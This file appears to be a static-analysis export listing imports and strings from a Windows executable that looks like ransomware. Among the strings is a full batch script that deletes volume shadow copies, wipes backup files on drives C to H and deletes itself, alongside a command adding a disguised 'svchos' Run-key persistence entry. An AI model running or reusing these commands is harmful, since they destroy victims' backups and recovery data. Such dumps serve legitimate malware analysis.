reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x1400075c0	0x1400180b8	import	0x140006910	KERNEL32.dll.GetProcAddress
0x1400075cd	0x1400265a0	string	0x140006910	0?.&!\a4
0x1400075d4	0x1400180b8	import	0x140006910	KERNEL32.dll.GetProcAddress
0x1400075e1	0x140025bdc	string	0x140006910	1?=/8
0x1400075e8	0x1400180b8	import	0x140006910	KERNEL32.dll.GetProcAddress
0x1400075f5	0x14002624e	string	0x140006910	%?==8
0x140007603	0x1400180b8	import	0x140006910	KERNEL32.dll.GetProcAddress
0x140007610	0x14002605a	string	0x140006910	%?=/8
0x140007617	0x1400180b8	import	0x140006910	KERNEL32.dll.GetProcAddress
0x140007624	0x140025b14	string	0x140006910	$3'\r
0x14000762b	0x1400180b8	import	0x140006910	KERNEL32.dll.GetProcAddress
0x140007646	0x1400180b8	import	0x140006910	KERNEL32.dll.GetProcAddress
0x140007653	0x140020120	string	0x140006910	MoveFileExW
0x140007661	0x1400180b8	import	0x140006910	KERNEL32.dll.GetProcAddress
0x140007675	0x1400180b8	import	0x140006910	KERNEL32.dll.GetProcAddress
0x140007690	0x1400180b8	import	0x140006910	KERNEL32.dll.GetProcAddress
0x1400076a4	0x1400180b8	import	0x140006910	KERNEL32.dll.GetProcAddress
0x1400076b8	0x1400180b8	import	0x140006910	KERNEL32.dll.GetProcAddress
0x1400076c5	0x140020130	string	0x140006910	SetFilePointerEx
0x1400076d3	0x1400180b8	import	0x140006910	KERNEL32.dll.GetProcAddress
0x1400076ee	0x1400180b8	import	0x140006910	KERNEL32.dll.GetProcAddress
0x1400076fb	0x140025e66	string	0x140006910	$(,\f
0x140007702	0x1400180b8	import	0x140006910	KERNEL32.dll.GetProcAddress
0x140007716	0x140025d6c	string	0x140006910	!(,\b%\a\n;
0x14000771d	0x1400180b8	import	0x140006910	KERNEL32.dll.GetProcAddress
0x14000772a	0x140025cd6	string	0x140006910	!(,\b%\a
0x140007731	0x1400180b8	import	0x140006910	KERNEL32.dll.GetProcAddress
0x14000773e	0x140020148	string	0x140006910	CreateThread
0x140007745	0x1400180b8	import	0x140006910	KERNEL32.dll.GetProcAddress
0x140007760	0x1400180b8	import	0x140006910	KERNEL32.dll.GetProcAddress
0x14000776d	0x140026730	string	0x140006910	!5\n\e4
0x14000777b	0x1400180b8	import	0x140006910	KERNEL32.dll.GetProcAddress
0x140007788	0x140025d08	string	0x140006910	!(,\b%\a
0x14000778f	0x1400180b8	import	0x140006910	KERNEL32.dll.GetProcAddress
0x14000779c	0x14002608c	string	0x140006910	%?=/8
0x1400077aa	0x1400180b8	import	0x140006910	KERNEL32.dll.GetProcAddress
0x1400077be	0x1400180b8	import	0x140006910	KERNEL32.dll.GetProcAddress
0x1400077cb	0x140026668	string	0x140006910	0?.-4
0x1400077d9	0x1400180b8	import	0x140006910	KERNEL32.dll.GetProcAddress
0x140007b23	0x14002750c	string	0x140007900	lTGg_
0x140007b76	0x140020160	string	0x140007900	vssadmin Delete Shadows /all /quiet\r\nvssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB\r\nvssadmin resize shadowstorage /for=c: /on=c: /maxsize=unbounded\r\nvssadmin resize shadowstorage /for=d: /on=d: /maxsize=401MB\r\nvssadmin resize shadowstorage /for=d: /on=d: /maxsize=unbounded\r\nvssadmin resize shadowstorage /for=e: /on=e: /maxsize=401MB\r\nvssadmin resize shadowstorage /for=e: /on=e: /maxsize=unbounded\r\nvssadmin resize shadowstorage /for=f: /on=f: /maxsize=401MB\r\nvssadmin resize shadowstorage /for=f: /on=f: /maxsize=unbounded\r\nvssadmin resize shadowstorage /for=g: /on=g: /maxsize=401MB\r\nvssadmin resize shadowstorage /for=g: /on=g: /maxsize=unbounded\r\nvssadmin resize shadowstorage /for=h: /on=h: /maxsize=401MB\r\nvssadmin resize shadowstorage /for=h: /on=h: /maxsize=unbounded\r\nvssadmin Delete Shadows /all /quiet\r\ndel /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk\r\ndel /s /f /q d:\*.VHD d:\*.bac d:\*.bak d:\*.wbcat d:\*.bkf d:\Backup*.* d:\backup*.* d:\*.set d:\*.win d:\*.dsk\r\ndel /s /f /q e:\*.VHD e:\*.bac e:\*.bak e:\*.wbcat e:\*.bkf e:\Backup*.* e:\backup*.* e:\*.set e:\*.win e:\*.dsk\r\ndel /s /f /q f:\*.VHD f:\*.bac f:\*.bak f:\*.wbcat f:\*.bkf f:\Backup*.* f:\backup*.* f:\*.set f:\*.win f:\*.dsk\r\ndel /s /f /q g:\*.VHD g:\*.bac g:\*.bak g:\*.wbcat g:\*.bkf g:\Backup*.* g:\backup*.* g:\*.set g:\*.win g:\*.dsk\r\ndel /s /f /q h:\*.VHD h:\*.bac h:\*.bak h:\*.wbcat h:\*.bkf h:\Backup*.* h:\backup*.* h:\*.set h:\*.win h:\*.dsk\r\ndel %0
0x140007e59	0x140020758	string	0x140007e40	kernel32.dll
0x140007e68	0x140018078	import	0x140007e40	KERNEL32.dll.LoadLibraryA
0x140007e79	0x140020768	string	0x140007e40	IsWow64Process
0x140007ea8	0x1400180b8	import	0x140007e40	KERNEL32.dll.GetProcAddress
0x140007eb6	0x140018108	import	0x140007e40	KERNEL32.dll.GetCurrentProcess
0x140007ec9	0x1400180d8	import	0x140007e40	KERNEL32.dll.FreeLibrary
0x140007f2e	0x1400180b0	import	0x140007ef0	KERNEL32.dll.GetWindowsDirectoryW
0x140007f9a	0x14001ffd0	string	0x140007ef0	\System32\cmd.exe
0x140007fcd	0x140018100	import	0x140007ef0	KERNEL32.dll.GetModuleFileNameW
0x140007fd3	0x140020780	string	0x140007ef0	/C REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "svchos" /t REG_SZ /d "
0x140008136	0x140020850	string	0x140007ef0	" /f
0x1400081a6	0x140020860	string	0x140007ef0	/reg:64
0x1400081d9	0x1400182f0	import	0x140007ef0	SHELL32.dll.ShellExecuteW
0x14000824f	0x140018168	import	0x140008244	KERNEL32.dll.SetUnhandledExceptionFilter
0x140008258	0x140018160	import	0x140008244	KERNEL32.dll.UnhandledExceptionFilter
0x14000825e	0x140018108	import	0x140008244	KERNEL32.dll.GetCurrentProcess
0x140008271	0x140018170	import	0x140008244	KERNEL32.dll.TerminateProcess
0x14000829d	0x14000846c	string	0x140008244	@SVWH
0x140008409	0x140018148	import	0x1400083fc	KERNEL32.dll.RtlCaptureContext
0x140008421	0x140018150	import	0x1400083fc	KERNEL32.dll.RtlLookupFunctionEntry
0x140008458	0x140018158	import	0x1400083fc	KERNEL32.dll.RtlVirtualUnwind
0x140008477	0x140018148	import	0x14000846c	KERNEL32.dll.RtlCaptureContext
0x140008491	0x140018150	import	0x14000846c	KERNEL32.dll.RtlLookupFunctionEntry
0x1400084c8	0x140018158	import	0x14000846c	KERNEL32.dll.RtlVirtualUnwind
0x140008a2c	0x140018198	import	0x140008a00	KERNEL32.dll.GetSystemTimeAsFileTime
0x140008a3a	0x140018190	import	0x140008a00	KERNEL32.dll.GetCurrentThreadId
0x140008a46	0x140018188	import	0x140008a00	KERNEL32.dll.GetCurrentProcessId
0x140008a56	0x140018180	import	0x140008a00	KERNEL32.dll.QueryPerformanceCounter
0x140008ac3	0x1400181a0	import	0x140008abc	KERNEL32.dll.InitializeSListHead
0x140008b5d	0x140018148	import	0x140008b18	KERNEL32.dll.RtlCaptureContext
0x140008b77	0x140018150	import	0x140008b18	KERNEL32.dll.RtlLookupFunctionEntry
0x140008bb8	0x140018158	import	0x140008b18	KERNEL32.dll.RtlVirtualUnwind
0x140008c0c	0x1400181a8	import	0x140008b18	KERNEL32.dll.IsDebuggerPresent
0x140008c2d	0x140018168	import	0x140008b18	KERNEL32.dll.SetUnhandledExceptionFilter
0x140008c38	0x140018160	import	0x140008b18	KERNEL32.dll.UnhandledExceptionFilter
0x140008c7c	0x1400181b0	import	0x140008c60	KERNEL32.dll.GetStartupInfoW
0x140008ca6	0x1400181b8	import	0x140008ca0	KERNEL32.dll.GetModuleHandleW
0x140008cfb	0x140018168	import	0x140008cf4	KERNEL32.dll.SetUnhandledExceptionFilter
0x140008fe5	0x140018100	import	0x140008fb4	KERNEL32.dll.GetModuleFileNameW
0x140008ffd	0x140018060	import	0x140008fb4	KERNEL32.dll.GetLastError
0x140009041	0x1400183b8	string	0x140008fb4	Main Invoked.
0x1400090fd	0x140018100	import	0x1400090cc	KERNEL32.dll.GetModuleFileNameW
0x140009115	0x140018060	import	0x1400090cc	KERNEL32.dll.GetLastError
0x140009159	0x1400183c8	string	0x1400090cc	Main Returned.
0x140009524	0x1400181f8	import	0x140009478	KERNEL32.dll.LoadLibraryExW
0x140009537	0x140018060	import	0x140009478	KERNEL32.dll.GetLastError
0x14000954a	0x1400181f8	import	0x140009478	KERNEL32.dll.LoadLibraryExW
0x140009587	0x1400180d8	import	0x140009478	KERNEL32.dll.FreeLibrary
0x1400095bb	0x1400180b8	import	0x140009478	KERNEL32.dll.GetProcAddress
0x140009662	0x1400184a8	string	0x140009640	EventRegister
0x140009673	0x1400184a8	string	0x140009640	EventRegister
0x1400096f6	0x1400184c0	string	0x1400096c4	EventSetInformation
0x140009755	0x1400184d8	string	0x140009748	EventUnregister
0x140009768	0x1400184d8	string	0x140009748	EventUnregister
0x1400097cf	0x1400184f0	string	0x14000979c	EventWriteTransfer
0x140009841	0x140018510	string	0x140009834	FlsAlloc
0x140009854	0x140018510	string	0x140009834	FlsAlloc
0x140009877	0x1400181d8	import	0x140009834	KERNEL32.dll.TlsAlloc
0x140009894	0x140018528	string	0x140009888	FlsFree
0x1400098a7	0x140018528	string	0x140009888	FlsFree
0x1400098cb	0x1400181f0	import	0x140009888	KERNEL32.dll.TlsFree
0x1400098ee	0x140018548	string	0x1400098dc	FlsSetValue
0x1400098f7	0x140018548	string	0x1400098dc	FlsSetValue
0x14000992d	0x1400181e8	import	0x1400098dc	KERNEL32.dll.TlsSetValue
0x14000995b	0x140018560	string	0x140009944	InitializeCriticalSectionEx
0x14000996e	0x140018560	string	0x140009944	InitializeCriticalSectionEx
0x1400099a0	0x1400181d0	import	0x140009944	KERNEL32.dll.InitializeCriticalSectionAndSpinCount
0x140009a12	0x1400180d8	import	0x1400099f4	KERNEL32.dll.FreeLibrary
0x140009b9f	0x140018210	import	0x140009b80	KERNEL32.dll.DeleteCriticalSection
0x140009c10	0x1400181b8	import	0x140009bdc	KERNEL32.dll.GetModuleHandleW
0x140009d7c	0x140018108	import	0x140009d54	KERNEL32.dll.GetCurrentProcess
0x140009d87	0x140018170	import	0x140009d54	KERNEL32.dll.TerminateProcess
0x140009d96	0x140018218	import	0x140009d54	KERNEL32.dll.ExitProcess
0x140009db7	0x140018ef8	string	0x140009da0	mscoree.dll
0x140009dc0	0x140018220	import	0x140009da0	KERNEL32.dll.GetModuleHandleExW
0x140009dcf	0x140018f10	string	0x140009da0	CorExitProcess
0x140009dd6	0x1400180b8	import	0x140009da0	KERNEL32.dll.GetProcAddress
0x140009dfb	0x1400180d8	import	0x140009da0	KERNEL32.dll.FreeLibrary
0x140009ebf	0x140009ec6	string	0x140009e84	HcȺ\b blocks=Basic Latin,Latin Extended-B
0x14000a024	0x140018200	import	0x14000a020	KERNEL32.dll.EnterCriticalSection
0x14000a030	0x140018208	import	0x14000a02c	KERNEL32.dll.LeaveCriticalSection
0x14000a1a5	0x14000a1dd	string	0x14000a154	E+BHI
0x14000a241	0x14000a27a	string	0x14000a1f0	E+BHI
0x14000a91d	0x14000a938	string	0x14000a914	<Nu'
0x14000ac05	0x14000ac16	string	0x14000aa90	E2\rA
0x14000ac0f	0x14000ac16	string	0x14000aa90	E2\rA
0x14000ad63	0x140018f7c	string	0x14000ad0c	(null)
0x14000b326	0x140018f88	string	0x14000b2d8	(null)
0x14000b33f	0x140018f7c	string	0x14000b2d8	(null)
0x14000bc93	0x140018238	import	0x14000bc48	KERNEL32.dll.GetModuleFileNameA
0x14000bed9	0x14000be86	string	0x14000be2c	A86taH
0x14000c8fa	0x140018120	import	0x14000c8e4	KERNEL32.dll.HeapFree
0x14000c90c	0x140018060	import	0x14000c8e4	KERNEL32.dll.GetLastError
0x14000c962	0x1400180a8	import	0x14000c924	KERNEL32.dll.HeapAlloc
0x14000ca91	0x1400180a8	import	0x14000ca3c	KERNEL32.dll.HeapAlloc
0x14000ce4e	0x140018200	import	0x14000ce3c	KERNEL32.dll.EnterCriticalSection
0x14000ce77	0x140018210	import	0x14000ce58	KERNEL32.dll.DeleteCriticalSection
0x14000cea2	0x140018208	import	0x14000ce90	KERNEL32.dll.LeaveCriticalSection
0x14000cf48	0x1400181f8	import	0x14000ceac	KERNEL32.dll.LoadLibraryExW
0x14000cf56	0x140018060	import	0x14000ceac	KERNEL32.dll.GetLastError
0x14000cf69	0x1400181f8	import	0x14000ceac	KERNEL32.dll.LoadLibraryExW
0x14000cfa2	0x1400180d8	import	0x14000ceac	KERNEL32.dll.FreeLibrary
